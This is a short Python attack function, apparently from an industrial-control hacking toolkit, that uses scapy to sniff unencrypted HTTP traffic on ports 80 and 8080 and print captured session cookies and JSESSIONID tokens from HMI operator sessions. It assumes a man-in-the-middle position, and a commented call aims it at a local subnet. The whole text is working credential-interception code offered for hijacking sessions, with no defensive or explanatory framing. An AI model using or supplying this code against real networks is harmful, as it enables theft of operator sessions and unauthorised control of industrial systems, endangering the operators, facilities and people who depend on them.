def hmi_session_hijacking(target_network):
    """
    Intercept HMI session cookies/tokens
    Requires MitM position on network
    """
    from scapy.all import sniff, TCP, Raw

    def packet_callback(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load

            # Look for session tokens in HTTP traffic
            if b'Cookie:' in payload or b'SessionID' in payload:
                print(f"[+] Captured session data:")
                print(payload.decode('utf-8', errors='ignore'))

                # Extract cookie
                if b'JSESSIONID' in payload:
                    cookie = payload.split(b'JSESSIONID=')[1].split(b';')[0]
                    print(f"[!] Session cookie: {cookie}")

    print("[*] Sniffing for HMI session tokens...")
    sniff(filter="tcp port 80 or tcp port 8080", prn=packet_callback, count=100)

# hmi_session_hijacking('192.168.1.0/24')
